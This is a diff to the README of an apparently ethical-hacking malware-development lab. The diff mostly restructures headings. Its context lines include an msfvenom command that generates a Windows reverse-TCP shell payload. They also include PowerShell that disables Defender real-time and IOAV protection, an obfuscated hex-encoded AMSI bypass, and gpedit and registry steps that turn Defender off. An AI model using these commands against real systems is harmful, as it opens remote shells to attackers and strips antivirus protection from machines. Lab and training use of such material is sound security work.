@@ -12,7 +12,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP_ADDR> LPORT=4444 -f c
 ```
 ![payload](./Screenshots/01.png)
 
-Turn off the defender
+# Turn off the defender
+
+## Step 01
+`Windows 10` or lower version should be fine after this step, but if you are testing in `Window 11+`, I recommend you to go through step 2 and 3 as well.
 ```powershell
 
 Set-MpPreference -DisableIOAVProtection $true
@@ -20,7 +23,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 ```
 
-// Turn off Virus detection
+## Step 02
 ```powershell
 # WIN + R
 gpedit.msc
@@ -36,7 +39,7 @@ gpedit.msc
 - Go to `Real-time Protectio`n under the `Microsoft Defender Antivirus settings`.
 - Find Turn off `real-time protection` and set it to `Enabled`
 
-// 02
+## Step 03
 ```powershell
 # WIN + R 
 regedit
@@ -46,6 +49,9 @@ Go to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
 - DisableAntiSpyware = 1
 - DisableRoutinelyTakingAction = 1
 - ServiceStartStates = 4
+
+
+---
 
 # References
 - Most of codes are from [Malware-Development-for-Ethical-Hackers
